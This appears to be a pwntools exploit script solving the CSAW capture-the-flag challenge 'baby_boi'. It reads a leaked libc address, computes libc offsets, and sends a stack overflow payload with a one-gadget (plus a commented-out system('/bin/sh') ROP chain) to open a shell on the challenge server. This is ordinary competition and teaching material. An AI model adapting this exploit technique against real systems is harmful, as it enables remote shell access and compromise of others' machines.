from pwn import *

TARGET = './baby_boi'
LIBC = './libc-2.27.so'
HOST = 'pwn.chal.csaw.io'
PORT = 1005

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})

elf = ELF(TARGET)
libc = ELF(LIBC)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

while(1):
    r = remote(HOST, PORT)
    r.recvuntil('Here I am: ')
    leak = int(r.recvuntil('\n')[:-1], 16)
    if leak >> (8*5) != 0x7f:
        break
    else:
        r.close()

context.log_level = 'debug'
base = leak - libc.sym['printf']
system = base + libc.sym['system']
binsh = base + next(libc.search('/bin/sh'))

dbg("leak")
dbg("base")
rdi = 0x400642+1
gadget = [0x4f2c5, 0x4f322, 0x10a38c]

payload = 'A' * 40
payload += p64(base+gadget[2])
# payload += '\x04'
# payload += p64(rdi)
# payload += p64(binsh)
# payload += p64(rdi+1)
# payload += p64(system)
r.sendline(payload)

r.interactive()
r.close()
